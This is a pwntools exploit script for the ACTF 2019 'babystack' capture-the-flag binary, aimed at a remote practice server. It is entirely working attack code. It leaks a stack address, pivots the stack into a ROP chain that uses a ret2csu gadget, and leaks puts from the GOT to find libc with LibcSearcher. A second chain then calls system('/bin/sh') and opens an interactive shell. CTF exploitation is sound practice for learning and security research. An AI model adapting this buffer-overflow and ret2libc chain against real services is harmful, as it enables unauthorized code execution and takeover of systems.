from pwn import *
from LibcSearcher import *
context.log_level = 'debug'

# io = process('./ACTF_2019_babystack')
io = remote('node4.buuoj.cn', 26302)
elf = ELF('./ACTF_2019_babystack')

io.sendlineafter(b'>', b'224')
io.recvuntil(b'Your message will be saved at ')
stack_addr = int((io.recvuntil(b'\n', drop=True).decode())[2:], 16)
print(hex(stack_addr))

poprdi_ret = 0x400ad3
main = 0x4008F6

payload = p64(poprdi_ret)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x400ACA)
payload += p64(0)		# rbx
payload += p64(1)		# rbp
payload += p64(elf.got['read'])	# r12
payload += p64(0x30)		# r13
payload += p64(stack_addr + 18 * 8)	# r14
payload += p64(0)		# r15
payload += p64(0x400AB0)
payload += p64(0) * 6
payload = payload.ljust(0xD0, b'\x00') + p64(stack_addr - 0x8) + p64(0x400A18)

io.sendafter(b'>', payload)

io.recvuntil(b'Byebye~\n')
puts = u64(io.recvuntil(b'\n', drop=True) + b'\x00\x00')
print(hex(puts))

libc = LibcSearcher('puts', puts)
base = puts - libc.dump('puts')
print(hex(base))
system = base + libc.dump('system')
binsh = base + libc.dump('str_bin_sh')

payload = p64(poprdi_ret)
payload += p64(binsh)
payload += p64(system)
io.send(payload)

io.interactive()
